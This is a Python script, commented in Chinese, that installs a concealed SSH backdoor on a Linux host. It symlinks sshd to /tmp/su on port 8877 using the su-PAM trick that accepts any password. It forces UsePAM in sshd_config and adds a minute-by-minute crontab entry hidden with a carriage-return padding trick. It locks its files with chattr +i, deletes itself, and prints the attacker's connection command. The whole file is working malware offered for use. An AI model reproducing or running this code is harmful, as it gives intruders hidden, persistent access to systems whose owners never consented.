# coding=utf-8
# !/usr/bin/env python
from __future__ import print_function
import subprocess
import os, sys


def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def check_py():
    if sys.version_info.major == 3:
        print("当前运行的是 Python 3 版本。")
        ret = '3'
    elif sys.version_info.major == 2:
        print("当前运行的是 Python 2 版本。")
        ret = '2'
    else:
        print("未知的 Python 版本。")
        ret = ' '
    return ret


def etc_crontab(shell, file_path):
    py = check_py()
    with open(file_path, 'w') as file:
        file.write(shell)

    command = '(crontab -l;printf "*/1 * * * * ' + ' python' + py + ' ' + file_path + ';\\rno crontab for `whoami` %100c\\n")|crontab -'
    ml(command)

    if os.path.exists(file_path):
        print("Yes----crontab计划任务写入成功")
    else:
        print("No----crontab计划任务写入失败")


def miyue(new_content):
    filename = "/etc/ssh/sshd_config"
    with open(filename, 'a') as file:
        file.write(new_content + '\n')


def check_uac(port):
    command = 'cat /etc/ssh/sshd_config|grep UsePAM'
    j = ml(command)
    if 'UsePAM yes' in j:
        print('可以使用crontab&SSH后门，使用ps -aux关闭连接，删除/tmp/su文件')
    else:
        print('正在开启UsePAM')
        try:
            miyue('UsePAM yes')
        except Exception as e:
            print('权限出现错误,配置文件写入失败')
        print('可以使用crontab&SSH后门，使用ps -aux关闭连接，删除/tmp/su文件')
    user = ml('whoami').strip()
    print('------>连接命令为:ssh ' + str(user) + '@ip -p ' + str(port)+'<------')


def delete_current_script():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("当前脚本文件已成功删除" + script_path)
    except Exception as e:
        print("无法删除当前脚本文件：", e)


if __name__ == '__main__':
    port = "8877"
    shell = """
# coding=utf-8
# !/usr/bin/env python
from __future__ import print_function
import subprocess

def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout
def  check_ps(port):
    j = ml('ps -aux')
    result = '/tmp/su -oPort=' + str(port)
    if not result in j:
        command = 'ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=' + str(port)
        ml(command)
if __name__ == '__main__':
    check_ps(""" + port + """)
    """
    check_uac(port)
    file_path = "/tmp/.11"
    etc_crontab(shell, file_path)
    command = 'chmod + x ' + file_path
    ml(command)
    ml('chattr +i /var/spool/cron/')
    ml('chattr +i /tmp/su')
    ml('chattr +i ' + file_path)
    delete_current_script()  # 删除当前执行脚本文件
